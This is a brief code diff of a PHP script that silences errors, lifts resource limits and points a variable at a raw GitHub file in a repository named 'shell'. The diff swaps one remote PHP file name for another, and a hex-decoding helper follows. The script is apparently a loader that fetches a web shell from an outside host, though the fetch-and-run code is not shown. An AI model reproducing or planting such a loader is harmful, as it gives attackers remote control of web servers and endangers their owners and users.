@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('memory_limit', '512M');
 @set_time_limit(180);
 
-$u = 'https://raw.githubusercontent.com/0xAmm404/shell/refs/heads/main/miniliteNOPAS.php';
+$u = 'https://raw.githubusercontent.com/0xAmm404/shell/refs/heads/main/0xNix.php';
 
 function _fx($hex)
 {
